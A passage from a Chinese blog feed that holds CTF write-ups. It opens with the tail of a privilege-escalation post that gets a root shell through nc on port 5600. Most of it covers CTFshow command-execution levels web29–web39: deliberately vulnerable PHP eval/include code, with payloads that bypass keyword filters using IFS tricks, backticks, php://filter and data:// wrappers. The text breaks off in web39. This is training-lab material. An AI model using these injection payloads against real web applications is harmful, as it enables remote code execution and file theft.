href="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668484137083-7bf91795-42f6-48c0-95d8-97645841b0a6.png#averageHue=%23262936&amp;clientId=uf5bc22af-a5c1-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=185&amp;id=u777983af&amp;margin=[object">https://cdn.nlark.com/yuque/0/2022/png/29257370/1668484137083-7bf91795-42f6-48c0-95d8-97645841b0a6.png#averageHue=%23262936&amp;clientId=uf5bc22af-a5c1-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=185&amp;id=u777983af&amp;margin=[object</a> Object]&amp;name&#x3D;image.png&amp;originHeight&#x3D;231&amp;originWidth&#x3D;692&amp;originalType&#x3D;binary&amp;ratio&#x3D;1&amp;rotation&#x3D;0&amp;showTitle&#x3D;false&amp;size&#x3D;43409&amp;status&#x3D;done&amp;style&#x3D;none&amp;taskId&#x3D;u14f799fb-b645-4c92-a485-6a9baf49737&amp;title&#x3D;&amp;width&#x3D;553.6)3.3.1.1.6图for i in <code>ps -ef|grep root|grep -v &quot;grep&quot;|awk &#39;&#123;print $2&#125;&#39;</code>; do python2.7 1.py $i; done<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668489150146-a906bab8-25c4-4974-948a-444262de9a2e.png#averageHue=%23242732&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=351&id=u3fa4cea7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=351&originWidth=844&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72052&status=done&style=none&taskId=u5f8c1489-6c6a-4484-b0eb-ecf35efc31f&title=&width=844" alt="image.png">3.3.3.1.7图这个脚本会开放5600端口，nc连接后就是root权限，成功提权<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668490892086-5619368e-44ea-47fe-8e9a-eaf40e2bd2e4.png#averageHue=%23232630&clientId=u1bb2e56a-de14-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=459&id=u00f119c8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=574&originWidth=783&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117307&status=done&style=none&taskId=u064a3761-3254-4363-8864-4f2d835ba00&title=&width=626.4" alt="image.png">3.3.1.1.8图</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-web入门-命令执行（持续更新）</title>
      <link href="/2022/11/06/CTFshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/11/06/CTFshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<ul><li></li></ul><h1 id="CTFshow-web入门-命令执行"><a href="#CTFshow-web入门-命令执行" class="headerlink" title="CTFshow-web入门-命令执行"></a>CTFshow-web入门-命令执行</h1><p>[TOC]</p><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>访问页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:26:48</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码分析</strong></p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081407733.png" alt="image-20221008134424678"></p><p>基本没过滤什么重要参数，我们用最简单的system试试</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081407597.png" alt="image-20221008135323009"></p><p>成功了，我们直接用通配符绕过flag参数即可</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&quot;tac fla*&quot;);</span><br></pre></td></tr></table></figure><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20221008140923600.png" alt="image-20221008140923600"></p><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:42:26</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关过滤了flag和system还有php，不过我们依然可以用echo中的&#96;&#96;执行命令语句绕过</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081705552.png" alt="image-20221008170450601"></p><p><strong>payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=echo `tac f*`;</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081706981.png" alt="image-20221008170601925"></p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>访问页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:49:10</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码分析：这关过滤了flag、system、php、cat、sort、shell、.、空格、&#39;</p><p>我们依然可以使用echo来饶过，空格的话替换成()或者进行过滤</p><p>空格过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%09 符号需要php环境</span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cat过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br><span class="line">xxd :以16进制查看</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081712856.png" alt="image-20221008171246807"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&quot;tac fla*&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081721312.png" alt="image-20221008172118263"></p><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 00:56:31</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><p>这题主要过滤了flag、system、php、cat、sort、shell、.、空格、单引号、&#96;、echo、;、（</p><p>我们这关可以用include来做,分号被过滤了就用?&gt;</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081732971.png" alt="image-20221008173215911"></p><p>include不能直接读取php文件，所以我们套一个php伪协议</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include&quot;$_GET[cmd]&quot;?&gt;&amp;cmd=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081742205.png" alt="image-20221008174218155"></p><p>接下来用将页面中的base64进行解码即可得到flag</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081743899.png" alt="image-20221008174314862"></p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 02:22:27</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line">//</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关比上一关就过滤了一个双引号，我们用上一关payload去掉include的双引号同样可以绕过</p><p><strong>payload</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[cmd]?&gt;&amp;cmd=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081747128.png" alt="image-20221008174710802"></p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 04:21:23</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;\=/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关比上一关多过滤个冒号</p><p>同样使用上一关payload绕过</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[cmd]?&gt;&amp;cmd=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081749449.png" alt="image-20221008174919394"></p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 04:21:23</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关比上一关多过滤了&lt;</p><p>同样使用上关payload</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[cmd]?&gt;&amp;cmd=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081752842.png" alt="image-20221008175233786"></p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 04:21:16</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关过滤了0-9的数字，不过对我们不影响因为我们的构造的传参是cmd，同样用上关payload即可</p><p><strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[cmd]?&gt;&amp;cmd=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081757640.png" alt="image-20221008175703587"></p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 05:18:55</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关和上几关不同，多了一个文件包含，我们可以利用data执行参数</p><p>data协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081815301.png" alt="image-20221008181549240"></p><p>成功执行</p><p>接下来我们用system函数执行命令即可</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;)?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081816416.png" alt="image-20221008181639356"></p><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 05:23:36</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关比上一关多过滤了php和file</p><p>过滤了标准php代码风格，但我们可以用最简短的代码风格绕过</p><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081821259.png" alt="image-20221008182139196"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?=system(&quot;tac f*&quot;);?&gt;     </span><br></pre></td></tr></table></figure><p>或者base64绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/images202210081824317.png" alt="image-20221008182404259"></p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-04 00:12:34</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-04 06:13:21</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span 